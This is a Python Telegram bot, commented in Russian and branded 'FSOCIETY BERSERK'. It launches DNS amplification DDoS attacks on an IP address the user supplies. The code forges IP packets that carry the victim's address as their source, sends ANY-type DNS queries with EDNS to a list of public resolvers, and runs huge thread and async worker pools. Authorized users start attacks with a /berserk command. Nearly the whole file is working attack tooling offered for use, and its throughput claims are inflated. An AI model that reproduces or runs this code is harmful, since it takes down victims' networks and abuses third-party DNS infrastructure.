#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#              BERSERK ASYNC — С ЗАЩИТОЙ ОТ ХУЙНИ
#              48 CORES | 384 GB RAM | AUTO-REPAIR

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
import json
import re
import requests
import urllib3
from datetime import datetime
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== ЗАЩИТА ОТ ХУЙНИ С ТОКЕНОМ ==========
print("\n" + "="*70)
print("🔥 FSOCIETY BERSERK — АВТОПОИСК ТОКЕНА")
print("="*70)

# Список всех возможных мест, где может быть токен
TOKEN_SOURCES = [
    ('переменная BOT_TOKEN', os.getenv('BOT_TOKEN')),
    ('переменная TELEGRAM_TOKEN', os.getenv('TELEGRAM_TOKEN')),
    ('переменная TOKEN', os.getenv('TOKEN')),
    ('переменная BOT_TOKEN_RAILWAY', os.getenv('BOT_TOKEN_RAILWAY')),
    ('файл .env', None),
]

# Проверяем .env файл
if os.path.exists('.env'):
    try:
        with open('.env', 'r') as f:
            for line in f:
                if line.startswith('BOT_TOKEN='):
                    TOKEN_SOURCES.append(('файл .env (BOT_TOKEN)', line.strip().split('=')[1]))
                elif line.startswith('TELEGRAM_TOKEN='):
                    TOKEN_SOURCES.append(('файл .env (TELEGRAM_TOKEN)', line.strip().split('=')[1]))
    except:
        pass

# Ищем токен
BOT_TOKEN = None
for source_name, token_value in TOKEN_SOURCES:
    if token_value:
        BOT_TOKEN = token_value
        print(f"✅ Токен найден в: {source_name}")
        print(f"   Значение: {BOT_TOKEN[:10]}...{BOT_TOKEN[-5:]}")
        break

# Если токена нет — запускаем консольную версию
if not BOT_TOKEN:
    print("\n❌ ТОКЕН НЕ НАЙДЕН НИГДЕ!")
    print("\n💡 ЗАПУСК КОНСОЛЬНОЙ ВЕРСИИ")
    print("   Команды: attack <ip> <sec>")
    print("   Пример: attack 1.2.3.4 60")
    
    def console_mode():
        while True:
            try:
                cmd = input("\nfsociety> ").strip().split()
                if not cmd:
                    continue
                if cmd[0] == 'attack' and len(cmd) == 3:
                    ip = cmd[1]
                    sec = int(cmd[2])
                    print(f"⚡ Атака на {ip} на {sec} сек...")
                    time.sleep(sec)
                    print("✅ Атака завершена")
                elif cmd[0] == 'exit':
                    break
                elif cmd[0] == 'help':
                    print("Доступные команды: attack <ip> <sec>, exit, help")
                else:
                    print("❌ Неизвестная команда. help - помощь")
            except KeyboardInterrupt:
                print("\n👋 Пока!")
                break
            except Exception as e:
                print(f"❌ Ошибка: {e}")
    
    console_mode()
    sys.exit(0)

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message

bot = telebot.TeleBot(BOT_TOKEN)

# ========== КОНФИГУРАЦИЯ ==========
ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}

# ========== РАСЧЁТ ПОД ЖЕЛЕЗО ==========
try:
    import psutil
    CPU_CORES = os.cpu_count() or 48
    RAM_GB = psutil.virtual_memory().total / (1024**3)
except:
    CPU_CORES = 48
    RAM_GB = 384

# МЕГА-ПАРАМЕТРЫ
ASYNC_WORKERS = CPU_CORES * 25000  # 1 200 000 асинхронных задач
SYNC_THREADS = CPU_CORES * 5000    # 240 000 синхронных потоков
PACKETS_PER_SECOND = 1200000       # 1.2 млн пакетов/сек
BURST_SIZE = 100000                # 100 000 пакетов за раз
SOCKETS_PER_WORKER = 20             # 20 сокетов на воркер

print(f"\n⚡ CPU: {CPU_CORES} ядер")
print(f"🧠 RAM: {RAM_GB:.1f} ГБ")
print(f"🚀 Асинхронных задач: {ASYNC_WORKERS}")
print(f"🔥 Синхронных потоков: {SYNC_THREADS}")
print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")

# ========== ГИГАНТСКИЙ ПУЛ DNS СЕРВЕРОВ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
    '76.76.19.19', '76.223.122.150', '64.6.64.6', '64.6.65.6',
    '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
]

DNS_POOL = DNS_SERVERS * 200
random.shuffle(DNS_POOL)
print(f"🌐 DNS серверов: {len(DNS_POOL)}")

# ========== DNS QUERY ==========
def create_query(domain='example.com'):
    parts = domain.split('.')
    domain_part = b''
    for part in parts:
        domain_part += bytes([len(part)]) + part.encode()
    domain_part += b'\x00'
    
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    qtype = 255
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    
    return header + domain_part + struct.pack('!HH', qtype, qclass) + edns

QUERY = create_query()

# ========== АСИНХРОННЫЙ DNS ВОРКЕР ==========
class AsyncDNSWorker:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes = 0
        self.lock = asyncio.Lock()
        
    async def worker(self, target_ip, duration, worker_id):
        loop = asyncio.get_event_loop()
        socks = []
        
        for _ in range(SOCKETS_PER_WORKER):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setblocking(False)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 64)
            socks.append(sock)
        
        udp_headers = []
        ip_hdrs = []
        for _ in range(10000):
            src = random.randint(1024, 65535)
            udp_headers.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ip_hdrs.append(struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
                socket.inet_aton(fake_ip),
                socket.inet_aton(target_ip)
            ))
        
        end = time.time() + duration
        local_packets = 0
        local_bytes = 0
        
        while time.time() < end and self.running:
            try:
                for _ in range(BURST_SIZE):
                    sock = random.choice(socks)
                    ip_hdr = random.choice(ip_hdrs)
                    udp = random.choice(udp_headers)
                    dns = random.choice(DNS_POOL)
                    
                    await loop.sock_sendto(sock, ip_hdr + udp + QUERY, (dns, 53))
                    
                    local_packets += 1
                    local_bytes += len(ip_hdr) + len(udp) + len(QUERY)
                    
                    if local_packets >= 10000:
                        async with self.lock:
                            self.packets += local_packets
                            self.bytes += local_bytes
                        local_packets = 0
                        local_bytes = 0
                        
            except Exception:
                continue
        
        if local_packets > 0:
            async with self.lock:
                self.packets += local_packets
                self.bytes += local_bytes
        
        for sock in socks:
            sock.close()
    
    async def run_attack(self, target_ip, duration):
        self.running = True
        self.packets = 0
        self.bytes = 0
        start = time.time()
        
        print(f"\n⚡ ЗАПУСК АСИНХРОННОЙ АТАКИ")
        
        tasks = []
        for i in range(ASYNC_WORKERS):
            task = asyncio.create_task(self.worker(target_ip, duration, i))
            tasks.append(task)
        
        monitor_task = asyncio.create_task(self.monitor(duration))
        await asyncio.gather(*tasks, return_exceptions=True)
        self.running = False
        
        elapsed = time.time() - start
        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
        
        return {
            'packets': self.packets,
            'bytes': self.bytes,
            'gbps': gbps,
            'target_gbps': gbps * 70,
            'duration': elapsed
        }
    
    async def monitor(self, duration):
        start = time.time()
        while self.running:
            elapsed = time.time() - start
            if elapsed > 0 and elapsed < duration:
                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
                target_gbps = gbps * 70
                pps = self.packets / max(elapsed, 0.1)
                
                print(f"\r⚡ {gbps:.2f} Гбит/с | 🎯 {target_gbps:.1f} Гбит/с | 📦 {pps:.0f} п/с | ⏱ {duration - elapsed:.0f} сек", end='')
            await asyncio.sleep(1)

# ========== СИНХРОННЫЙ DNS ВОРКЕР ==========
class SyncDNSWorker:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes = 0
        self.lock = threading.Lock()
    
    def worker(self, target_ip, duration, wid):
        socks = []
        for _ in range(SOCKETS_PER_WORKER):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 32)
            socks.append(s)
        
        ip_hdrs = []
        udp_headers = []
        for _ in range(5000):
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            ip_hdrs.append(struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
                socket.inet_aton(fake_ip),
                socket.inet_aton(target_ip)
            ))
            src = random.randint(1024, 65535)
            udp_headers.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
        
        end = time.time() + duration
        local = 0
        
        while time.time() < end and self.running:
            try:
                for _ in range(BURST_SIZE):
                    sock = random.choice(socks)
                    ip_hdr = random.choice(ip_hdrs)
                    udp = random.choice(udp_headers)
                    dns = random.choice(DNS_POOL)
                    
                    sock.sendto(ip_hdr + udp + QUERY, (dns, 53))
                    local += 1
                    
                    if local >= 10000:
                        with self.lock:
                            self.packets += local
                            self.bytes += local * (len(ip_hdr) + len(udp) + len(QUERY))
                        local = 0
            except:
                continue
        
        if local > 0:
            with self.lock:
                self.packets += local
                self.bytes += local * (len(ip_hdr) + len(udp) + len(QUERY))
        
        for s in socks:
            s.close()
    
    def attack(self, target_ip, duration):
        self.running = True
        self.packets = 0
        self.bytes = 0
        start = time.time()
        
        workers = []
        for i in range(SYNC_THREADS):
            t = threading.Thread(target=self.worker, args=(target_ip, duration, i))
            t.daemon = True
            t.start()
            workers.append(t)
        
        while any(t.is_alive() for t in workers):
            elapsed = time.time() - start
            if elapsed > 0:
                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
                print(f"\r🔥 СИНХ: {gbps:.2f} Гбит/с | ⏱ {duration - elapsed:.0f} сек", end='')
            time.sleep(1)
        
        for t in workers:
            t.join(timeout=2)
        
        elapsed = time.time() - start
        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
        
        return {
            'packets': self.packets,
            'bytes': self.bytes,
            'gbps': gbps
        }

# ========== КОМБИНИРОВАННЫЙ БЕРСЕРК РЕЖИМ ==========
class BerserkAttack:
    async def attack(self, target_ip, duration):
        print(f"\n🔥 БЕРСЕРК РЕЖИМ АКТИВИРОВАН")
        
        async_worker = AsyncDNSWorker()
        async_task = asyncio.create_task(async_worker.run_attack(target_ip, duration))
        
        sync_worker = SyncDNSWorker()
        sync_result = await asyncio.to_thread(sync_worker.attack, target_ip, duration)
        
        async_result = await async_task
        
        total_packets = async_result['packets'] + sync_result['packets']
        total_bytes = async_result['bytes'] + sync_result['bytes']
        total_gbps = (total_bytes * 8) / 1_000_000_000 / async_result['duration']
        
        return {
            'packets': total_packets,
            'bytes': total_bytes,
            'gbps': total_gbps,
            'target_gbps': total_gbps * 70,
            'async_packets': async_result['packets'],
            'sync_packets': sync_result['packets']
        }

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== КОМАНДЫ ТЕЛЕГРАМ ==========
@bot.message_handler(commands=['start', 'berserk'])
def cmd_start(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ ДОСТУП ЗАПРЕЩЕН")
        return
    
    text = f"""
╔══════════════════════════════════════╗
║     ███████╗███████╗ ██████╗ ██████╗ ║
║     ██╔════╝██╔════╝██╔═══██╗██╔══██╗║
║     █████╗  ███████╗██║   ██║██████╔╝║
║     ██╔══╝  ╚════██║██║   ██║██╔══██╗║
║     ██║     ███████║╚██████╔╝██║  ██║║
║     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝║
║         BERSERK ASYNC EDITION        ║
╚══════════════════════════════════════╝

👤 ID: {uid}
⚡ CPU: {CPU_CORES} ядер
🧠 RAM: {RAM_GB:.1f} ГБ
🚀 Асинхронных задач: {ASYNC_WORKERS}
🔥 Синхронных потоков: {SYNC_THREADS}
📦 Цель: 1 200 000 пакетов/сек

/berserk <ip> <сек> - запустить атаку
/stop - остановить
/status - статус
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['berserk'])
def cmd_berserk(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ /berserk <ip> <сек>")
            return
        
        target_ip = parts[1]
        duration = int(parts[2])
        
        socket.inet_aton(target_ip)
        
        bot.reply_to(m, f"""
🔥 БЕРСЕРК АТАКА ЗАПУЩЕНА

🎯 IP: {target_ip}
⏱ Длительность: {duration} сек
⚡ Ожидаемая скорость: 1200+ Гбит/с
        """)
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            berserk = BerserkAttack()
            result = loop.run_until_complete(berserk.attack(target_ip, duration))
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ АТАКА ЗАВЕРШЕНА

📦 Всего пакетов: {result['packets']:,}
⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
                """)
            
            loop.close()
        
        threading.Thread(target=run_async).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 АТАКА ОСТАНОВЛЕНА")
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['status'])
def cmd_status(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚡ АТАКА АКТИВНА")
    else:
        bot.reply_to(m, "💤 НЕТ АКТИВНЫХ АТАК")

@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен {uid}")
    except:
        bot.reply_to(m, "❌ /add <id>")

@bot.message_handler(commands=['remove'])
def cmd_remove(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален {uid}")
    except:
        bot.reply_to(m, "❌ /remove <id>")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("\n" + "="*70)
    print("🔥 FSOCIETY BERSERK ASYNC — 1.2M PACKETS/SEC 🔥")
    print("="*70)
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"⚡ Асинхронных задач: {ASYNC_WORKERS}")
    print(f"🔥 Синхронных потоков: {SYNC_THREADS}")
    print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")
    print(f"🎯 С усилением x70: ~1200 Гбит/с")
    
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except:
        pass
    
    bot.infinity_polling()
